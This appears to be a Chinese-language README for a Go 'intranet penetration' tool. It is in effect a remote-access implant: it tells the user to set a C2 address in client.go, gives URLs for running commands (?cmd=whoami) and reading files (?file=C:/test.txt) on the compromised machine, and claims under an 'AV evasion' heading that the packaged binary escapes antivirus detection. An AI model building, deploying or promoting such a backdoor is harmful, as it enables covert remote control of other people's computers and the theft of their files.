# bridge
## 介绍
用Go写的最简单的内网穿透程序，穿透完成后，服务端可以进行命令执行与文件读取。
需要修改client.go第14行为c2地址。
利用URL分别为：server-host:6602/?cmd=whoami & server-host:6602/?file=C:/test.txt" 

## 免杀
打包后杀毒软件不标红。会有SmartScreen提示。
